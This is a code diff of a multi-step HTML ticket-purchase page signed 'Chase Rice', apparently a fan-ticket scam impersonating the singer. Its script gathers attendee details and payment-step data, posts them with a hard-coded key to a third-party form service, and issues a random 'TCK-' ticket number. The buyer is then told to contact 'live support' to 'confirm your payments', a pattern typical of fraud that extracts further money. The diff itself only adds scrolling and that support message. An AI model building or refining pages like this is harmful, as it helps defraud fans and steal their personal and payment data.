@@ -1294,9 +1294,6 @@ See you soon, Chase Rice</p>
     <li><strong>Name:</strong> <span id="userName"></span></li>
     <li><strong>Email:</strong> <span id="userEmail"></span></li>
   </ul>
-  <button id="homeBtn" style="margin-top:15px; background-color:#333; color:#fff; padding:10px 20px;">Back to Home</button>
-</div>
-    <!-- New message line -->
     <li style="margin-top:10px; color:#d35400; font-weight:bold;">
       📢 Contact live support to validate your ticket and confirm your payments and schedule
     </li>
@@ -1305,11 +1302,12 @@ See you soon, Chase Rice</p>
 </div>
 
 <script>
-<script>
+document.addEventListener("DOMContentLoaded", () => {
   // Step navigation
   document.getElementById("proceedBtn").addEventListener("click", () => {
     document.getElementById("step1").style.display = "none";
     document.getElementById("step2").style.display = "block";
+    document.getElementById("step2").scrollIntoView({behavior:"smooth"});
   });
 
   ["step2","step3","step4","step5"].forEach((step, idx) => {
@@ -1317,6 +1315,7 @@ See you soon, Chase Rice</p>
       e.preventDefault();
       this.style.display = "none";
       document.getElementById("step" + (idx+3)).style.display = "block";
+      document.getElementById("step" + (idx+3)).scrollIntoView({behavior:"smooth"});
     });
   });
 
@@ -1342,7 +1341,6 @@ See you soon, Chase Rice</p>
   document.getElementById("paymentStep").addEventListener("submit", async function(e) {
     e.preventDefault();
 
-    // Collect all form data
     const allForms = ["step2","step3","step4","step5","paymentStep"];
     const formData = new FormData();
     formData.append("access_key", "42ad2877-f81e-4e64-9fc2-51d25c4a455e");
@@ -1367,39 +1365,18 @@ See you soon, Chase Rice</p>
       if (result.success) {
         const ticketNumber = "TCK-" + Math.floor(Math.random() * 1000000);
 
-        // Hide payment step
         document.getElementById("paymentStep").style.display = "none";
-
-        // Show confirmation step
         document.getElementById("confirmationStep").style.display = "block";
 
-        // Populate ticket details
-        document.getElementById("ticketMessage").textContent = "✅ Thank you! Your ticket has been confirmed.";
+        // Ticket message with support line
+        document.getElementById("ticketMessage").innerHTML =
+          "✅ Thank you! Your ticket has been confirmed.<br>" +
+          "📢 Contact live support to validate your ticket and confirm your payments and schedule";
+
         document.getElementById("ticketNumber").textContent = ticketNumber;
         document.getElementById("eventName").textContent = document.getElementById("eventName").value;
-
-        // Pull attendee info from Step 3
-        const step3Inputs = document.querySelectorAll("#step3 input, #step3 select");
-        const attendeeDetails = {};
-        step3Inputs.forEach(input => {
-          const label = input.previousSibling.textContent || input.name || input.id;
-          attendeeDetails[label.replace(":","")] = input.value;
-        });
-
-        // Build summary table
-        let summaryHTML = "<table style='width:100%; border-collapse:collapse; margin-top:15px;'>";
-        for (const [key, value] of Object.entries(attendeeDetails)) {
-          summaryHTML += `
-            <tr>
-              <td style="border:1px solid #ccc; padding:8px; font-weight:bold;">${key}</td>
-              <td style="border:1px solid #ccc; padding:8px;">${value}</td>
-            </tr>`;
-        }
-        summaryHTML += "</table>";
-
-        // Insert summary into confirmation step
-        document.getElementById("confirmationStep").insertAdjacentHTML("beforeend", summaryHTML);
-
+        document.getElementById("userName").textContent = document.querySelector("#step3 input[type='text']").value;
+        document.getElementById("userEmail").textContent = document.querySelector("#step3 input[type='email']").value;
       } else {
         alert("❌ Submission failed. Please try again.");
       }
@@ -1408,12 +1385,15 @@ See you soon, Chase Rice</p>
     }
   });
 
-  // Back to home button
-  document.getElementById("homeBtn").addEventListener("click", function() {
+  // Back to home
+  document.getElementById("homeBtn").addEventListener("click", () => {
     document.getElementById("confirmationStep").style.display = "none";
     document.getElementById("step1").style.display = "block";
+    document.getElementById("step1").scrollIntoView({behavior:"smooth"});
   });
+});
 </script>
+
 
 
 
